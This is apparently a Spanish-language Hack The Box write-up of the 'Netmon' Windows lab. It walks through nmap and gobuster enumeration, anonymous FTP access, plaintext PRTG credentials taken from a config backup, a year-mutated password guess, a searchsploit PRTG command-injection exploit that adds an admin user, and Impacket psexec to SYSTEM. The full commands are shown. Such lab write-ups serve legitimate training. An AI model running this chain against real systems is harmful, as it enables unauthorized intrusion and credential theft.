# 🏴 Writeup — Netmon

| | |
|---|---|
| **🖥️ OS** | Windows |
| **🎯 IP** | 10.129.230.176 |
| **💀 Dificultad** | Fácil |
| **🌐 Plataforma** | Hack The Box |
| **📅 Fecha** | 04-03-2026 |
| **✅ Pwned** | 🟢 Sí |

---

## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración, lanzamos un ping para verificar conectividad con la máquina objetivo. Además del simple echo reply, aprovecharemos el valor del **TTL** para intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

### `ping` — Verificación de conectividad y detección de OS por TTL
```bash
ping -c 1 10.129.230.176
```

| Parámetro | Descripción |
|---|---|
| `-c 1` | Envía **un único paquete ICMP** y termina |
| `10.129.230.176` | **IP objetivo** a la que se lanza el ping |

![](/assets/Netmon-img-04-03-2026.png)

Como se puede observar en el output, obtenemos respuesta con un TTL de **127**, lo que nos indica que estamos ante una máquina **Windows**. Confirmada la conectividad, procedemos con la enumeración.

---

### 👁️ Enumeración con NMAP

#### 📌 Enumeración de puertos

Comenzamos la fase de enumeración identificando qué puertos se encuentran abiertos en la máquina objetivo. Para ello utilizamos nmap en su modalidad de SYN Scan, que nos permite realizar un escaneo rápido y sigiloso sobre el rango completo de puertos sin completar el three-way handshake.
```bash
nmap -sS -p- --open --min-rate 5000 -n -Pn 10.129.230.176 -vvv -oN ports
```

| Parámetro | Descripción |
|---|---|
| `-sS` | **SYN Scan** (half-open). Sigiloso y rápido, requiere root |
| `-p-` | Escanea los **65535 puertos** posibles |
| `--open` | Muestra **únicamente los puertos abiertos** |
| `--min-rate 5000` | Mínimo **5000 paquetes por segundo** |
| `-n` | Sin resolución DNS |
| `-Pn` | Sin ping previo, asume el host activo |
| `-vvv` | Triple verbose, muestra información en tiempo real |
| `-oN ports` | Guarda el output en un archivo llamado `ports` |

![](/assets/Netmon-img-04-03-2026-1.png)

El escaneo revela una superficie de ataque amplia y variada. Puertos más relevantes:

| Puerto | Servicio | Observación |
|---|---|---|
| **21** | FTP | Posible login anónimo habilitado |
| **80** | HTTP | Servicio web activo, pendiente de inspección |
| **139/445** | SMB | Protocolos de red Windows |
| **5985** | WinRM | RCE posible con credenciales válidas |

---

#### 📌 Enumeración de versiones y servicios

Con los puertos identificados, lanzamos nmap con detección de versiones y scripts por defecto. Conocer la versión exacta de cada servicio es lo que nos permitirá buscar vulnerabilidades concretas.
```bash
nmap -sC -sV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 --min-rate 5000 -n -Pn -vvv 10.129.230.176 -oN version
```

| Parámetro | Descripción |
|---|---|
| `-sC` | Scripts por defecto del motor NSE |
| `-sV` | Detección de versiones de los servicios |
| `-p21,80,135,...` | Únicamente los puertos encontrados anteriormente |
| `--min-rate 5000` | Mínimo 5000 paquetes por segundo |
| `-n` / `-Pn` | Sin DNS ni ping previo |
| `-oN version` | Guarda el output en un archivo llamado `version` |

![](/assets/Netmon-img-04-03-2026-2.png)
![](/assets/Netmon-img-04-03-2026-4.png)

> 🔎 El script `ftp-anon` confirma **login anónimo habilitado** en el FTP. El servicio web en el puerto 80 está activo y responde.

---

#### 📌 Enumeración de posibles vulnerabilidades
```bash
nmap --script vuln -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 --min-rate 5000 -n -Pn -vvv -oN vuln 10.129.230.176
```

| Parámetro | Descripción |
|---|---|
| `--script vuln` | Categoría NSE que comprueba vulnerabilidades conocidas |
| `-p21,80,...` | Apunta únicamente a los puertos ya identificados |
| `-oN vuln` | Guarda el output en un archivo llamado `vuln` |

![](/assets/Netmon-img-04-03-2026-5.png)

> ⚠️ El escaneo no devuelve resultados relevantes, probablemente por filtrado o Defender activo. Continuamos explorando los vectores identificados manualmente.

---

#### 📌 Fuzzing web
```bash
gobuster dir -u http://10.129.230.176 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --ne -x php,htm,html,csv,txt,xml --add-slash -t 40 -xl 0
```

| Parámetro | Descripción |
|---|---|
| `dir` | Modo fuerza bruta de directorios y archivos |
| `-u` | URL objetivo |
| `-w` | Wordlist en variante medium |
| `--ne` | No muestra errores en el output |
| `-x php,htm,...` | Añade extensiones a cada entrada de la wordlist |
| `--add-slash` | Añade barra final para detectar directorios |
| `-t 40` | 40 hilos en paralelo |
| `-xl 0` | Excluye respuestas con longitud 0 |

---

## 💥 Explotación

### 📂 Acceso FTP anónimo — Flag de usuario

El **login anónimo FTP** permite conectarse sin credenciales usando `anonymous` como usuario. En entornos Windows, esto puede exponer el sistema de archivos completo del servidor.
```bash
ftp anonymous@10.129.230.176
```

| Parámetro | Descripción |
|---|---|
| `anonymous` | Usuario especial para acceso sin credenciales |
| `10.129.230.176` | IP del servidor FTP objetivo |

Una vez dentro navegamos hasta `C:\Users\Public\Desktop\` y localizamos la flag de usuario.

![](/assets/Netmon-img-04-03-2026-7.png)

> ⚠️ No hay permisos de lectura directa en remoto. Descargamos el archivo con `get` y lo leemos desde local con `cat`.
```bash
get user.txt
```

![](/assets/Netmon-img-04-03-2026-8.png)

Flag de usuario obtenida. ✅

---

### 🌐 Reconocimiento web y exfiltración de credenciales

Accedemos al puerto 80 y encontramos el panel de login de **PRTG Network Monitor**, una herramienta de monitorización de infraestructura ampliamente utilizada en entornos empresariales. Sus archivos de configuración almacenan en muchas versiones **credenciales en texto plano o Base64**.

![](/assets/Netmon-img-05-03-2026.png)

La ruta por defecto donde PRTG almacena sus configuraciones en Windows es:
```
C:\ProgramData\Paessler\PRTG Network Monitor
```

Navegamos hasta ese directorio vía FTP y encontramos tres archivos:

| Archivo | Relevancia |
|---|---|
| `PRTG Configuration.dat` | Configuración activa |
| `PRTG Configuration.old` | Versión antigua |
| `PRTG Configuration.old.bak` | ⭐ **Backup — objetivo prioritario** |

Descargamos el `.bak` con `get` y lo analizamos con `cat`. Encontramos credenciales en texto plano:
```
Usuario:    prtgadmin
Contraseña: PrTg@dmin2018
```

> 💡 **Mutación contextual:** El backup data de **2018** pero la máquina es de **2019**. Probamos `PrTg@dmin2019` — y es la contraseña activa. Cuando una credencial falla, analiza el patrón e infiere variantes antes de descartar el vector.

![](/assets/Netmon-img-05-03-2026-1.png)
![](/assets/Netmon-img-05-03-2026-2.png)

---

### 🔓 RCE autenticado en PRTG

Con acceso al panel buscamos exploits con **searchsploit**:

![](/assets/Netmon-img-05-03-2026-6.png)

Encontramos el exploit **46527** — un script bash que explota una **inyección de comandos autenticada** en PRTG a través de su funcionalidad de notificaciones.

![](/assets/Netmon-img-05-03-2026-7.png)

El exploit requiere la **cookie de sesión activa**. La obtenemos desde las DevTools del navegador (`F12` → **Storage → Cookies**).

![](/assets/Netmon-img-05-03-2026-8.png)
![](/assets/Netmon-img-05-03-2026-9.png)
```bash
./46527.sh -u http://10.129.230.176 -c "OCTOPUS1813713946=ezkyRTYzN0M3LUQ4MTctNEZCNi1CNEY0LTQ3MjkzNkY1MjNCQ30%3D"
```

| Parámetro | Descripción |
|---|---|
| `-u` | URL del panel PRTG objetivo |
| `-c` | Cookie de sesión activa para autenticarse contra la API |

![](/assets/Netmon-img-05-03-2026-10.png)

El exploit crea automáticamente el usuario `pentest` / `P3nT3st!` en el grupo **Administrators**. Con estas credenciales usamos **psexec de Impacket** para obtener shell como `SYSTEM`.

> 💡 **Impacket psexec** se autentica vía SMB, sube un binario de servicio temporal y lo ejecuta, devolviendo una shell interactiva como `NT AUTHORITY\SYSTEM`.
```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py pentest@10.129.230.176
```

| Parámetro | Descripción |
|---|---|
| `psexec.py` | Obtiene shell interactiva como SYSTEM vía SMB |
| `pentest@10.129.230.176` | Usuario creado por el exploit + IP objetivo |

![](/assets/Netmon-img-05-03-2026-11.png)

Shell obtenida como `NT AUTHORITY\SYSTEM`. ✅ Navegamos a `C:\Users\Administrator\Desktop\` para recuperar la flag de root.

---

## 🔼 Escalada de Privilegios

La cadena completa — **FTP anónimo → credenciales en backup → panel PRTG → RCE autenticado → psexec** — otorga `SYSTEM` directamente. No es necesaria ninguna técnica de escalada adicional.

---

## 🏁 Flags

| Flag | Hash |
|---|---|
| 🧑 User | `...` |
| 👑 Root | `...` |

---

## 📝 Lecciones Aprendidas

> 💡 **El login anónimo FTP en Windows** no es solo un fallo menor — puede exponer el sistema de archivos completo del servidor, incluyendo rutas de aplicaciones con credenciales almacenadas.

> 💡 **Mutación contextual de credenciales:** encontrar `PrTg@dmin2018` en un backup y deducir `PrTg@dmin2019` es un razonamiento que en entornos reales marca la diferencia entre acceder o no.

> 💡 **El flujo credenciales web → exploit autenticado → psexec** es una cadena de ataque muy común en entornos Windows corporativos. Acceder a un panel de administración de software empresarial suele ser suficiente para comprometer el sistema operativo subyacente.